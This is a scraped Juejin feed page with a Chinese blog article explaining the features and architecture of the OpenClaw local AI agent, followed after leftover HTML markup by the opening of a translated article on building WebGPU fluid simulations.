<p>目前，网络上已涌现大量 OpenClaw 的部署教程，本文不再重复赘述（文末将附上笔者推荐的本地部署教程链接）。本篇内容笔者重点在于解析 <strong>OpenClaw 的核心特性与设计思路</strong>，通过通俗易懂的原理解读，帮助大家在体验其强大功能的同时，深入理解其工作机制，真正做到<strong>知其然，亦知其所以然</strong>。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/dd3eeb24d7ee453dacf3a0b0d533f0e8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=4qiB4UFED8ofvoeVzayjyiSggEM%3D" alt="0.png" width="70%" loading="lazy"/></p>
<h2 data-id="heading-1">一、OpenClaw特性详解</h2>
<h3 data-id="heading-2">1.1 OpenClaw能力概览</h3>
<p>作为 2026 年以来最受关注的开源项目，OpenClaw 的能力覆盖范围极广，几乎可以视作一位全能的“数字员工”。其主要应用场景包括：</p>
<ul>
<li><strong>自动化与开发</strong>：浏览器自动化、AI 自动编程、数据处理与报告生成。</li>
<li><strong>日常办公辅助</strong>：自动回复邮件、全网商品比价、整理备忘录、会议录音转文字纪要等。</li>
<li><strong>智能设备联动</strong>：接入智能家居，自动调节灯光、温度等环境参数。</li>
<li><strong>跨终端远程协作</strong>：通过与 iMessage 等即时通讯工具对接，用户可直接在手机端向 OpenClaw 下达指令，远程安排工作。更有开发者实现了通过 Apple Watch 远程指挥 OpenClaw 合并 PR、自动 Debug 等操作。</li>
</ul>
<p>总的来说凡是能够通过 <strong>Skills（技能模块）</strong>  或 <strong>MCP（Model Context Protocol，模型上下文协议）</strong>  封装实现的功能，OpenClaw 皆能无缝衔接。</p>
<p>注：如对 Agent Skills 或 MCP 不熟悉，可参阅笔者往期文章：</p>
<ul>
<li>《<a href="https://juejin.cn/post/7598918127578972194" target="_blank" title="https://juejin.cn/post/7598918127578972194">Agent Skills 完全指南：核心概念丨设计模式丨实战代码</a>》</li>
<li>《<a href="https://juejin.cn/post/7488895565314949120" target="_blank" title="https://juejin.cn/post/7488895565314949120">理论+代码一文带你深入浅出 MCP：人工智能大模型与外部世界交互的革命性突破</a>》</li>
</ul>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8b858711bb244d0b8f00948fdc92d520~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=JrV4cIExlXTwTZPL92ESW%2F0kxfI%3D" alt="2.png" loading="lazy"/></p>
<h3 data-id="heading-3">1.2 OpenClaw 核心特性</h3>
<p>除了广泛的能力覆盖，OpenClaw 在设计上还具有以下三大核心优势：</p>
<p><strong>1. 全平台接入与实时交互</strong><br/>
OpenClaw 可轻松接入各类聊天工具（如 Telegram、微信、iMessage 等）与智能设备。用户即使不在电脑前，也能通过手机远程指派任务。OpenClaw 不仅能执行操作，还能实时回传屏幕截图、执行日志等信息，让整个过程完全透明。此外，通过对接麦克风、摄像头等外设，它还能直接处理音视频信息，实现更自然的交互。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b611d17e8edf471b921409285adcb516~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=0op8yMs%2Bngwo7Ne%2FLc9jIVyjLPw%3D" alt="3.png" width="50%" loading="lazy"/></p>
<p><strong>2. 智能定时任务与主动判断</strong><br/>
OpenClaw内置强大的自然语言定时任务引擎。用户只需用日常语言描述，即可创建临时提醒、定期检查收件箱等任务。更重要的是，OpenClaw 具备事件紧急程度判断能力，可自主决定是否通过聊天工具主动联系用户。这一做法打破了传统“指令-执行”的被动循环，让智能体充分发挥它的主观能动性。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a506b7b3461b400d87619fd2972d7ef2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=A%2BGOqfYRcgDQBZiQHZF8UiZEmJs%3D" alt="4.png" width="50%" loading="lazy"/></p>
<p><strong>3. 持续进化的长期记忆</strong><br/>
OpenClaw 支持将记忆以文件形式存储在本地，并能在对话中快速检索相关记忆并放入上下文。随着使用频次增加，它会主动更新和优化这些记忆文件，实现“越用越聪明”的持续学习效果。</p>
<p>经过全网大量的实践证明，OpenClaw不仅是一个功能完善、性能前沿的全新一代智能体，而且运行稳定，各项参数生成完整，是一项完全能够应用于工业级场景的高性能智能体。或许OpenClaw的出现是我们人类第一次真正意义上拥有了期待已久的数字员工！</p>
<h2 data-id="heading-4">二、OpenClaw 原理解析</h2>
<p>OpenClaw 由前 PSPDFKit 创始人 Peter Steinberger 开发，一位自称为“退休程序员”，却打造出了一款颇具革命性的开源个人AI助手的大神! 该项目最初的理念是 “Claude with hands”（拥有双手的 Claude），旨在将大型语言模型的智能与本地系统的操作能力深度融合。</p>
<p>初次接触 OpenClaw，大家或许会联想到此前大火的 <a href="https://juejin.cn/post/7479212482546073611" target="_blank" title="https://juejin.cn/post/7479212482546073611">Manus</a> 等项目。但 OpenClaw 并非一个运行在浏览器中的网页应用，而是一个部署于本地的后台服务。这意味着它拥有极高的隐私安全性和对你电脑的直接操作权限。大家可以将其理解为一个成熟的“Computer Use”，能够执行命令行指令、在沙盒环境中运行代码，并操控浏览器等应用。</p>
<p>OpenClaw 与 Manus 等项目的本质区别，在于其以下几项核心架构的巧妙设计：</p>
<h3 data-id="heading-5">2.1 网关系统：协议无关的智能编排层</h3>
<p>OpenClaw 拥有一个强大且灵活的<strong>网关系统（Gateway System）</strong> 。它不仅仅是一个简单的 API 转发器，更是一个<strong>协议无关的编排层（Protocol-Agnostic Orchestrator）</strong> 。其核心在于维护一个持久的 WebSocket 连接，构建出一条实时、双向的通信通道。无论指令来自终端命令行、Web 控制面板，还是通过 iMessage 等通讯工具远程发送，网关都能将这些异构的输入信号即时标准化，并统一维护<strong>会话状态（Session State）</strong> 。</p>
<p>这也解释了为何许多用户选择使用 Mac Mini 作为 OpenClaw 的服务器：一方面是为了拥有一个 7x24 小时待命的专属 AI 助手；另一方面，在苹果生态下，用户可以直接通过 iPhone 或 Apple Watch 上的 iMessage 与远程 OpenClaw 对话，无需安装任何额外插件。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6743cd220f1348cbbe761fbd5a68ae79~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=3rOc5Tj7KDK3mhi8Lh6zinrM8S4%3D" alt="6.png" loading="lazy"/></p>
<h3 data-id="heading-6">2.2 四层记忆架构：实现无限长上下文与持续进化</h3>
<p>OpenClaw 的另一大核心优势在于其精巧的上下文管理工程。它通过 <strong>SOUL、TOOLS、USER、Session</strong> 四层记忆结构，构建了一套高性能的上下文管理系统。</p>
<ol>
<li><strong>SOUL（灵魂）</strong> ：智能体的不可变内核，包含了其底层的系统指令与核心行为准则。</li>
<li><strong>TOOLS（工具）</strong> ：动态的工具注册表。系统可根据当前环境，灵活注入可用的 API 和能力，实现按需调用。</li>
<li><strong>USER（用户记忆）</strong> ：基于语义向量的长期记忆库。OpenClaw 会在交互中自动学习并存储用户的偏好、习惯甚至代码风格，从而实现“越用越懂你”的个性化体验。</li>
<li><strong>Session（会话记忆）</strong> ：实时的情景记忆。它能捕捉当前对话中有价值的信息，并动态地将其纳入上下文，保证对话的连贯性。</li>
</ol>
<p>这套分层记忆体系不仅支撑了“无限长上下文”的对话体验，更是 OpenClaw 能够持续学习、不断进化的技术基石。这一整套的上下文记忆管理工程值得大家开发智能体借鉴学习。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0a46634fdc7a49fbbdd74921e4c1f197~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=J6fEFfMZh5d6UN0u6g2aGXud6j0%3D" alt="7.png" loading="lazy"/></p>
<h3 data-id="heading-7">2.3 Agent Skills 功能体系：即插即用的能力扩展</h3>
<p>如果说 MCP 协议是为了让智能体更高效地“调用工具”，那么 <strong>Agent Skills</strong> 则是直接为智能体“赋予能力”。</p>
<p>例如，安装 <code>apple-notes</code> Skill 后，OpenClaw 便即刻获得读写和操作苹果便签的全部权限；加载 <code>bird</code> Skill，它就能自动帮你搜集、整理推特信息，甚至代为发布推文。简而言之，<strong>想让 OpenClaw 具备什么能力，只需安装对应的 Skill 即可</strong>。</p>
<p>此外，OpenClaw 还支持完整的<strong>多模态模型调用</strong>，并集成了诸如看门狗（监控）子系统、插件体系、跨平台部署等多项企业级特性。由此可见，这绝非一个简单的“个人玩具”，而是在 Agent Skills 与 Vibe Coding 时代背景下，超越 Manus 的、面向未来的新一代通用智能体平台。</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8864ac619cc0453ba5b9c789e933c0bb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=00uX14ToOWk47vqyWOrGm4tdiK8%3D" alt="8.png" loading="lazy"/></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ac4100b4e6548a1b8909017b35d9129~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5aSn5qih5Z6L55yf5aW9546p:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770778510&amp;x-signature=12XJz7e7%2Fe86R3IozLf797R%2BuZI%3D" alt="9.png" loading="lazy"/></p>
<h2 data-id="heading-8">三、OpenClaw 实用指南：接入国内大模型与主流聊天工具</h2>
<p>无论是希望拥有一个专属的“贾维斯”来提升工作效率，还是作为开发者希望学习最前沿的 Agent 设计理念，OpenClaw 都是一个极具价值的高质量项目，非常值得在本地进行深入尝试和实践。</p>
<p>为了帮助大家快速实现一个“能干事、会沟通”的个人智能体，以下是笔者整理的 <strong>OpenClaw 接入国内主流聊天工具与国产大模型的实用指南汇总</strong>。</p>
<h3 data-id="heading-9">3.1 主流聊天工具接入</h3>
<p>OpenClaw 强大的网关系统使其能轻松适配各类即时通讯工具。以下是几个主流平台的接入教程：</p>
<ul>
<li>
<p><strong>接入 WhatsApp 指南</strong><br/>
视频教程：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1kH6nBFEPq" target="_blank" title="https://www.bilibili.com/video/BV1kH6nBFEPq" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1kH…</a></p>
</li>
<li>
<p><strong>接入飞书指南</strong><br/>
视频教程：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1kH6nBFEPq" target="_blank" title="https://www.bilibili.com/video/BV1kH6nBFEPq" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1kH…</a></p>
</li>
<li>
<p><strong>接入微信、钉钉、QQ 一站式指南</strong><br/>
视频教程：<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.bilibili.com%2Fvideo%2FBV1MfFAz6EnR" target="_blank" title="https://www.bilibili.com/video/BV1MfFAz6EnR" ref="nofollow noopener noreferrer">www.bilibili.com/video/BV1Mf…</a></p>
</li>
</ul>
<h3 data-id="heading-10">3.2 国产大模型集成方案</h3>
<p>除了默认的 Claude/OpenAI 模型，OpenClaw 架构也支持灵活对接国产大模型（如MinMax等）。通常只需在配置中替换对应的 API 端点与密钥，即可享受国产模型服务，在数据隐私与网络延迟上更具优势。</p>
<h3 data-id="heading-11">3.3 云平台一站式部署</h3>
<p>目前，<strong>阿里云、火山引擎</strong>等主流云平台已提供预集成的 OpenClaw 部署方案。在对应的云市场或AI平台服务中搜索 “OpenClaw”，即可找到官方或社区维护的镜像与部署模板，实现分钟级云端上线，非常适合不想折腾本地环境的用户。</p>
<p><strong>尝试部署属于大家的 OpenClaw，开启高效智能的“数字员工”时代吧！</strong></p>
<h2 data-id="heading-12">四、总结</h2>
<p>本文分享了OpenClaw核心特性与设计原理，并提供了接入国产大模型与主流聊天工具的实用指南。OpenClaw是2026年现象级开源智能体，它通过独特的网关系统实现全平台实时交互，凭借四层记忆架构拥有长期记忆与学习能力，并借由Agent Skills体系灵活扩展功能正向着未来时代的全能数字员工迈进。</p>
<p>2026注定是大模型接续爆发的一年！为了让大家彻底搞懂大模型的作用原理，笔者也发布了<a href="https://juejin.cn/column/7594655863548248116" target="_blank" title="https://juejin.cn/column/7594655863548248116">《数据到模型到应用：大模型训练全流程实战指南》</a>专栏，预计会有50期内容，将系统拆解从数据处理、模型训练到强化学习与智能体开发的全流程，并带大家从零实现模型，帮助大家掌握大模型训练的全技能，真正掌握塑造智能的能力！感兴趣大家可关注笔者掘金账号，更可关注笔者同名微信公众号：<strong>大模型真好玩</strong>，更多教程和大量大模型学习资料分享~</p>
<p>需要注意的是：大模型训练对计算资源有一定要求，尤其是GPU显存。为降低学习门槛，笔者与国内主流云平台合作，大家可以通过打开链接: <a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.lab4ai.cn%2Fregister%3FagentID%3Duser-XorgKKc56U" target="_blank" title="https://www.lab4ai.cn/register?agentID=user-XorgKKc56U" ref="nofollow noopener noreferrer">Lab4AI</a> ，体验<strong>H100 GPU 6.5小时</strong>的算力。本系列所有实战教程均将在该平台上完成，帮助大家低成本上手实践。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[一次 WebGPU 流体之旅]]></title>    <link>https://juejin.cn/post/7602544700475031562</link>    <guid>https://juejin.cn/post/7602544700475031562</guid>    <pubDate>2026-02-04T03:42:52.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602544700475031562" data-draft-id="7602512226999500850" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="一次 WebGPU 流体之旅"/> <meta itemprop="keywords" content="前端,面试,JavaScript"/> <meta itemprop="datePublished" content="2026-02-04T03:42:52.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="掘金安东尼"/> <meta itemprop="url" content="https://juejin.cn/user/1521379823340792"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            一次 WebGPU 流体之旅
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1521379823340792/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    掘金安东尼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-04T03:42:52.000Z" title="Wed Feb 04 2026 03:42:52 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    66
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读20分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>原文：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftympanus.net%2Fcodrops%2F2025%2F01%2F29%2Fparticles-progress-and-perseverance-a-journey-into-webgpu-fluids%2F" target="_blank" title="https://tympanus.net/codrops/2025/01/29/particles-progress-and-perseverance-a-journey-into-webgpu-fluids/" ref="nofollow noopener noreferrer">Particles, Progress, and Perseverance: A Journey into WebGPU Fluids</a></p>
<p>作者：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftympanus.net%2Fcodrops%2Fauthor%2Fhector%2F" target="_blank" title="https://tympanus.net/codrops/author/hector/" ref="nofollow noopener noreferrer">Hector Arellano</a></p>
<p>日期：2025年1月29日</p>
<p>翻译：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN" target="_blank" title="https://github.com/TUARAN" ref="nofollow noopener noreferrer">TUARAN</a></p>
</blockquote>
<blockquote>
<p>欢迎关注 <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FTUARAN%2Ffrontend-weekly-digest-cn" target="_blank" title="https://github.com/TUARAN/frontend-weekly-digest-cn" ref="nofollow noopener noreferrer">前端周刊</a>，每周更新国外论坛的前端热门文章，紧跟时事，掌握前端技术动态。</p>
</blockquote>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66a8f7b9d2d741bd8bb08aabe1c5e1aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5o6Y6YeR5a6J5Lic5bC8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770793485&amp;x-signature=%2BWk7ZnAXLhS03OdQS9rk8t%2FT0g0%3D" alt="image.png" loading="lazy"/></p>
<p>本文是一段回顾式的长旅程：作者用十多年的时间不断尝试“浏览器里做流体”，从 WebGL 时代的各种 Hack，一路走到 WebGPU 让许多“现代图形 API 能力”变得可用。</p>
<ul>
<li>Demo：<a href="https://link.juejin.cn?target=https%3A%2F%2Ftympanus.net%2FTutorials%2FWebGPUFluid%2F" target="_blank" title="https://tympanus.net/Tutorials/WebGPUFluid/" ref="nofollow noopener noreferrer">tympanus.net/Tutorials/W…</a></li>
<li>Code：<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FHectorArellanoDev%2FWebGPUFluids" target="_blank" title="https://github.com/HectorArellanoDev/WebGPUFluids" ref="nofollow noopener noreferrer">github.com/HectorArell…</a></li>
</ul>
<p>编者按：如果你关注过 Web 图形圈子，可能知道 Hector Arellano（又名 <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fhector_arellano" target="_blank" title="https://x.com/hector_arellano" ref="nofollow noopener noreferrer">Hat</a>）。这篇文章不仅是技术拆解，更是一段关于坚持、试错、与 Web 图形演进的故事。</p>
<p>注意：Demo 依赖 <strong>WebGPU</strong>，并非所有浏览器都支持。请使用支持 WebGPU 的浏览器（例如最新版 Chrome / Edge，并确保 WebGPU 已启用）。</p>
<p>在继续阅读之前……先去拿杯喝的——<em>这篇很长</em>。</p>
<h2 data-id="heading-0">13 年前……</h2>
<p>我正盯着电脑屏幕发呆（无聊得很），一个很要好的朋友 <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2FSirokos" target="_blank" title="https://x.com/Sirokos" ref="nofollow noopener noreferrer">Felix</a> 打电话给我，非常认真又兴奋地说：Gathering Party 刚发布了一个<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DLTOC_ajkRkU" target="_blank" title="https://www.youtube.com/watch?v=LTOC_ajkRkU" ref="nofollow noopener noreferrer">新 Demo</a>。它有流体模拟、粒子动画、惊艳的着色方案——最重要的是，它真的很美。</p>
<p>那时候 WebGL 还算“新东西”，把硬件加速的 3D 图形带进浏览器，看起来会打开很多门。我天真地以为：WebGL 也许能做出 Felix 给我看的那种东西。</p>
<p>但我开始研究那个 Demo 的实现方式时，就撞上了残酷现实：里面用到了一堆我从没听过的 API/特性——“Atomics（原子操作）”“Indirect Draw Calls（间接绘制调用）”“Indirect Dispatch（间接派发）”“Storage Buffers（存储缓冲区）”“Compute Shaders（计算着色器）”“3D Textures（三维纹理）”。</p>
<p>它们属于现代图形 API 的能力，但在当时的 WebGL 里基本不存在。</p>
<p>更别提它还用了很多听起来就很复杂的算法/技术：用 <strong>SPH（Smoothed Particle Hydrodynamics，平滑粒子流体动力学）</strong> 驱动粒子动画、用 <strong>histopyramids</strong> 做流压缩（我当时还想：我为什么需要这个？）、用 GPU 上的 <strong>marching cubes</strong>（从粒子生成三角形？？？）等等。</p>
<p>我完全不知道从哪里开始。更糟的是，Felix 跟我打赌：这种流体效果不可能在浏览器里“可用于生产”。</p>
<h2 data-id="heading-1">10 年前……</h2>
<p>又过了三年，Felix 说他还有一个<a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3Di8hSZGTXTx8" target="_blank" title="https://www.youtube.com/watch?v=i8hSZGTXTx8" ref="nofollow noopener noreferrer">更炸裂的 Demo</a>一定要我看。除了流体模拟，它还用实时光线追踪渲染了几何体——材质很震撼、画面很惊人。</p>
<p>这下挑战更大了：我不仅想模拟流体，我还想用光追去渲染它，得到漂亮的反射与折射。</p>
<p>我花了大概 3 年才把这些东西理解到能在 WebGL 里“硬凿”出来：</p>
<ul>
<li>我用 SPH 让粒子行为像流体；</li>
<li>我用 marching cubes 从粒子生成网格（见图 1 的描述）。</li>
</ul>
<p>当时没有 atomics，我就用多次 draw call 把数据塞进纹理的 RGBA 通道来“分层”；没有 storage buffer 和 3D 纹理，我就用纹理存数据，并用二维层来“模拟” 3D 纹理；没有 indirect draw，我就干脆按预期数量发起 draw call；没有 compute shader，我就用顶点着色器做 GPGPU 的数据重排……虽然也做不出那种“在 buffer 里随意写多个内存位置”的事，但至少我能在 GPU 里生成一个加速结构。</p>
<p>实现是能跑，但离“美”差得很远（Felix 直接评价：丑。确实丑，你可以想象图 2）。我那时也不太懂距离场，也不知道怎么把 shading 做得更有趣，基本就是老派 phong。</p>
<p>性能也限制了很多高级效果：环境光遮蔽、更复杂的反射折射……但至少我能渲染出点东西。</p>
<h2 data-id="heading-2">7 年前……</h2>
<p>再过三年，我又做了一些进展：实现了一个混合式光追。思路是：marching cubes 先生成三角形，然后用光追去算二次射线做反射/折射；同一个光追还能遍历加速结构去做焦散。这些基本都沿用了 <a href="https://link.juejin.cn?target=https%3A%2F%2Fx.com%2Fmattswoboda" target="_blank" title="https://x.com/mattswoboda" ref="nofollow noopener noreferrer">Matt Swoboda</a> 的想法（那些 Demo 的原作者）。我的工作大部分就是：把他的点子尽量在 WebGL 里跑起来（祝你好运）。</p>
<p>效果在视觉上还不错（类似图 3），但需要非常强的 GPU。当时我用的是 NVidia 1080GTX。也就是说：即使 WebGL 可行，也不可能拿去做“生产”。手机不行，普通笔记本也扛不住。</p>
<p>看得到“结果”，却用不到真实项目里，这种挫败感很强。我花了太多时间，最后也没有达到期望。至少，这套代码库还能继续帮我学习。</p>
<p>于是我停了。</p>
<p>Felix 赢了赌局。</p>
<p>这段铺垫对一篇“教程”来说太长了，但我想把背景交代清楚：有些 Demo 看起来像“几天搞定”，实际可能是多年积累；你要花时间学很多技术，也经常要借鉴别人的想法——最后也可能仍然失败。</p>
<h2 data-id="heading-3">WebGPU 登场</h2>
<p>还记得那些“现代图形 API 的关键词”吗？WebGPU 基于现代 API 标准，这意味着我不必再靠 Hack：</p>
<ul>
<li>我可以用 compute shader 直接操作 storage buffer；</li>
<li>我可以用 atomics 做邻域搜索、流压缩时的索引写入；</li>
<li>我可以用 dispatch indirect 来只生成必要数量的三角形，并用同样的方式绘制它们。</li>
</ul>
<p>我想学习 WebGPU，于是决定把之前的流体工作迁移过来，顺便理解新范式：怎么组织 pipeline 和 binding、怎么管理 GPU 内存与资源……做一个小 Demo 很适合练手。</p>
